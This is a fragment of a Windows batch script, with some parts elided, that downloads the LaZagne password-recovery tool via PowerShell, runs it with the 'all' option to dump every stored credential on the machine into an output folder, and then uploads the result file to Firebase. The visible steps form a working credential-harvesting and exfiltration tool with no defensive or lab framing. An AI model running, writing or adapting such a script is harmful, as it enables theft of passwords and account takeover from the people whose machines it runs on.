...
if not exist "%LAZAGNE_EXE%" (echo   Downloading... & powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'" & if errorlevel 1 (echo   [ERROR] Download failed! Check details below. & pause & exit /b 1) & if not exist "%LAZAGNE_EXE%" (echo   [ERROR] File not downloaded, check internet or URL. & pause & exit /b 1) & echo   [OK] Successfully downloaded.) else (echo   [OK] Already installed.)
pause
...
if not exist "%OUTPUT_DIR%" (mkdir "%OUTPUT_DIR%" 2>nul & if errorlevel 1 (echo   [ERROR] Failed to create directory! & pause & exit /b 1))
echo   [OK] Directory ready: %OUTPUT_DIR%
pause
echo [4/5] Collecting credentials...
if not exist "%LAZAGNE_EXE%" (echo   [ERROR] LaZagne.exe not found! & pause & exit /b 1)
echo   [INFO] Running LaZagne...
"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1
if errorlevel 1 (echo   [ERROR] Error running LaZagne! & pause & exit /b 1)
echo   [OK] LaZagne ran, waiting for output...
for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
if not defined RESULT_FILE (echo   [ERROR] No result file found! Checking directory: %OUTPUT_DIR% & dir "%OUTPUT_DIR%" & pause & exit /b 1)
...
if errorlevel 1 (echo   [ERROR] Firebase upload failed! & pause & exit /b 1)
